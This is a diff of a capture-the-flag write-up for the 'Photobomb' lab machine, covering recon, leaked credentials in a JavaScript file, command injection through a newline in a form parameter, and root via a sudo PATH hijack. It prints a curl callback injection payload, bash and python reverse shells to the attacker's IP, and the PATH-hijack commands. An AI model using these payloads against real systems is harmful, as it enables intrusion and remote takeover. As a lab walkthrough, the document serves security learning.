@@ -40,18 +40,18 @@ Lets explore further http on port 80
 #### Exploring the website
 After editing /etc/hosts and visiting the website, we get the following
 ![photobomb](imgs/website.png)
-Clicking the hyperlink directs us to a login form which we will surely try to manipulate! The page source returned nothing interesting. We continued by checking what the server returns in case of bad request
+Clicking the hyperlink directs us to a login form which we will surely try to manipulate! The page source returned nothing interesting. We can continue by checking what the server returns in case of bad request
 ```
 <center><h1>400 Bad Request</h1></center>
 <hr><center>nginx/1.18.0 (Ubuntu)</center>
 ```
-And the 404 response
+And in the case of a 404 response
 ![photobomb](imgs/404.png)
-Looking at the source page, we find a local URL with a port number
+Searching further, we find in the source page a local URL with a port number
 ```html
  <img src='http://127.0.0.1:4567/__sinatra__/404.png'>
 ```
-We attempted several scans on the port to see if it is active but got no positive results back
+We can attempt to run some scans on the port to see if it is active. After several tries with nmap and netcat we got no results back.
 #### Nikto scan
 We run the nikto scan to get a primary view of possible problems with our website
 ```bash
@@ -121,12 +121,6 @@ printer_icon.html       [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 1
 printer-icon            [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 180ms]
 printer-icon.php        [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 179ms]
 printer-icon.html       [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 172ms]
-printer-friendly        [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 144ms]
-printer-friendly.php    [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 137ms]
-printer-friendly.html   [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 140ms]
-printerFriendly         [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 151ms]
-printerFriendly.php     [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 151ms]
-printerFriendly.html    [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 148ms]
 ``` 
 ---
 ### Exploitation
@@ -169,8 +163,8 @@ We then pass them to ffuf
 ```bash
 $ ffuf -w payloads.txt -u http://photobomb.htb/printer -H "Authorization: Basic FUZZ" -fc 401
 ```
-We got not results. Re-tried same thing with different username, no result as well.
-After going through the website again I noticed a javascript file that I hadn't checked before
+We got not results. Re-tried same thing with different username, no result as well. Another attempt was to check if the login page was vulnerable to verb tampering or request smuggling. I ran several tries but got nothing at all. At this point I was sure there was something that I missed.  
+After going through the website again I noticed a javascript file that I haven't checked yet
 ```js
 function init() {
   // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
@@ -180,14 +174,14 @@ function init() {
 }
 window.onload = init;
 ```
-Looking at it closely, we can see that there's a URL that points to the login form alongside what looks like credentials and a comment about tech support. Turns out at last that the credentials are pH0t0:b0Mb!. Looking through http Authorization docs we found that its possible to pass credentials to http Basic Authorization in the URL.
+Looking at it closely, we can see that there's a URL that points to the login form alongside what looks like credentials and a comment about tech support. It turns out at last that the credentials are pH0t0:b0Mb!. Looking through http Authorization docs we can find that its possible to pass credentials to http Basic Authorization in the URL as such "username:password@AUTH_URL".
 
 #### Photo Galery and command injection
-Upon logging in we find the following page
+Upon logging in, we find the following page
 
 ![photobomb](imgs/photos.png)
 
-After searhing around ???? so we try download button
+After searhing around in the source page and doing some directory fuzzing, we get no results at all. So since the download button is all we got, we can try and test it with BurpSuite and see how it goes. So after clicking the button, the browser sends the following request:
 
 ```http
 POST /printer HTTP/1.1
@@ -207,15 +201,19 @@ Connection: close
 
 photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=jpg&dimensions=30x20
 ```
-
-Makes POST request with parameters... ???
-Could it be vulnerable ? We decided to test it by doing some input fuzzing
-First we set up a local php server to try and capture anything that our tests output
+We can attempt to manipulate the parameters and see what results we get.
+We can start testing it by doing some input fuzzing. We do that by injecting in the parameters characters like ';', 'space' and 'line breaks' along side other commands.
+What gave it away to me was when using the line break with the ping command.
+```bash
+%0aping%20$IP
+```
+After sending this request, the server's response was very delayed, since the ping commands takes some time to complete.
+To be 100% sure about the injection, we set up a local php server to try and capture a request sent by the payload.
 ```bash
 $ php -S 0.0.0.0:8000                                                        
 [Wed Feb  1 13:28:23 2023] PHP 8.1.12 Development Server (http://0.0.0.0:8000) started
-```
-???After tries it was successful
+``` 
+We send the following request
 
 ```http
 POST /printer HTTP/1.1
@@ -234,7 +232,7 @@ Connection: close
 
 photo=mark-mc-neill-4xWHIpY2QcY-unsplash.jpg&filetype=jpg%0acurl%2010.10.14.161:8000/&dimensions=30x20
 ```
-We captured it on our local server
+And we receive it on our local server!
 ```http
 [Wed Feb  1 13:29:17 2023] 10.10.11.182:57202 Accepted
 [Wed Feb  1 13:29:17 2023] 10.10.11.182:57202 [404]: GET / - No such file or directory
@@ -243,20 +241,21 @@ We captured it on our local server
 [Wed Feb  1 13:29:17 2023] 10.10.11.182:57208 [404]: GET /.jpg - No such file or directory
 [Wed Feb  1 13:29:17 2023] 10.10.11.182:57208 Closing
 ```
-Amazing, lets try to get some info out of it before attempting to spawn a reverse shell
+Amazing, lets try to get some info out of this before attempting to spawn a reverse shell
 
 ```
 [Wed Feb  1 13:45:31 2023] 10.10.11.182:59600 [404]: GET /?wizard - No such file or directory
 [Wed Feb  1 13:46:07 2023] 10.10.11.182:35262 [404]: GET /?/home/wizard/photobomb - No such file or directory
 ```
-We can attempt know and spawn a reverse shell. To do that we use [Reverse Shells Generator](https://www.revshells.com/). We tried at first to spawn a shell with bash but it was unsuccessful. So we tried to use python and it worked! We have access now to the machine. 
+We can attempt know and spawn a reverse shell. To do that, we use [Reverse Shells Generator](https://www.revshells.com/). We tried at first to spawn a shell with bash but it was unsuccessful. 
 ```bash
 $ sh -i >& /dev/tcp/10.10.14.112/8000 0>&1
 ```
+So we tried to use python which is usually installed on linux machines and it worked! 
 ```python
 $ export RHOST="10.10.14.112";export RPORT=8000;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
 ```
-whoami
+We have shell access now to the machine. 
 ```bash
 $ whoami
 wizzard
@@ -274,8 +273,65 @@ if !File.exists?('resized_images/' + filename)
   system(command)
 ```
 Basically, the input retrieved from the post request was not sanitized and was directly concatenated with a shell command that was put in place to resize images. In our injection, we used %0a which decodes to line break. This breaks the command and allows the execution of our payload.
+
 ---
 ### Post Exploitation
+#### Sudoers Privelege Escalation
+After getting normal user access to the machine, I started searching for common vulnerabilities that could allow us to get root access. At first ran the following bash command that would get us all SUID files
+```bash
+$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+-rwsrwxr-x 1 wizard wizard 36 Feb  1 20:24 /tmp/a/log/script
+-rwsr-xr-x 1 root root 88464 Mar 14  2022 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount
+-rwsr-xr-x 1 root root 85064 Mar 14  2022 /usr/bin/chfn
+-rwsr-xr-x 1 root root 166056 Jan 19  2021 /usr/bin/sudo
+-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at
+-rwsr-xr-x 1 root root 67816 Feb  7  2022 /usr/bin/su
+-rwsr-xr-x 1 root root 68208 Mar 14  2022 /usr/bin/passwd
+-rwsr-xr-x 1 root root 55528 Feb  7  2022 /usr/bin/mount
+-rwsr-xr-x 1 root root 53040 Mar 14  2022 /usr/bin/chsh
+-rwsr-xr-x 1 root root 44784 Mar 14  2022 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 39144 Feb  7  2022 /usr/bin/umount
+-rwsr-xr-x 1 root root 22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 473576 Mar 30  2022 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root messagebus 51344 Apr 29  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+```
+Got nothing particularly interesting. I checked then what we have as privelege in sudoers file
+```bash
+$ sudo -l
+User wizard may run the following commands on photobomb:
+    (root) SETENV: NOPASSWD: /opt/cleanup.sh
+```
+Interesting! Executing shell scripts as root can definetly get us somewhere. So I checked to see what the script looks like
+```bash
+#!/bin/bash
+. /opt/.bashrc
+cd /home/wizard/photobomb
+
+# clean up log files
+if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
+then
+  /bin/cat log/photobomb.log > log/photobomb.log.old
+  /usr/bin/truncate -s0 log/photobomb.log
+fi
+
+# protect the priceless originals
+find source_images -type f -name '*.jpg' -exec chown root:root {} \;
+```
+We can quickly notice that the PATH env variable is not predifined and we can see that 'find' is explicitly used (not specifying the full path). Combine all that with the fact that we can change script execution environment (since we have the "SETENV" tag in the sudoers file) and we can easily manipulate this script! We start with creating a file called find in /tmp
+```bash
+$ echo "/bin/bash" > /tmp/find
+```
+We can then execute the following command, that runs /opt/cleanup.sh while specifying that the PATH env variable is equal to /tmp. 
+```bash
+$ /usr/bin/sudo PATH=/tmp /opt/cleanup.sh
+```
+The 'find' command in the script will now execute from our file in /tmp. So we basically told the script to run /bin/bash as root for us. 
+```bash
+$ whoami
+root
+```
 ---
 
 > Any feedback would be appreciated. Thank you !
